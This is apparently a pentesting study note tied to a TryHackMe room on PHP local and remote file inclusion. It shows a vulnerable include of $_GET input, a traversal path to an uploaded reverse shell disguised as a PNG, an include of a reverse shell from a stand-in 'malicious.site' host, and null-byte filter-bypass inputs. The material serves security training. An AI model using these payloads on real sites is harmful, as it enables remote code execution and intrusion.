# File inclusion

[![fileinc](../../../../_badges/thmp/fileinc.svg)](https://tryhackme.com/room/fileinc)

<div class="row row-cols-md-2"><div>

Files inclusion refers to websites that are importing a file using the user input <small>(`import/require` in PHP)</small>. 

For instance: `http://vulnerable.site/?lang=FR` that is doing an include using `$_GET["lang"]` as seen below.

```php!
include "lang/$_GET[lang].php"
```

If the import is not filtered, we can use [Path traversal](traversal.md) to include a malicious file, such as one we uploaded using another attack.
</div><div>

**Local File Inclusion (LFI)** 🏠: inject a local file

```php
// ex: we uploaded a reverse shell (a fake PNG)
// as our avatar (avatar.png), then we could use:
include "lang/../uploads/avatar.png"
```

**Remote File Inclusion (RFI)** ✈️: inject a remote file

```php
// 🛑 allow_url_fopen MUST BE SET TO true
include "http://malicious.site/reverse_shell.php"
```
</div></div>

<hr class="sep-both">

## Additional notes 🔎

<div class="row row-cols-md-2 mt-4"><div>

* **PHP < 5.3.4**: if there was a constraint of a specific extension, you could use the **Null Byte** `%00` which indicates the end of a string.

```php
# bypass filter .md only
file=xxx.php%00.md
```

```php
include "xxx.cgi%00.php" // include xxx.cgi
```
</div><div>
</div></div>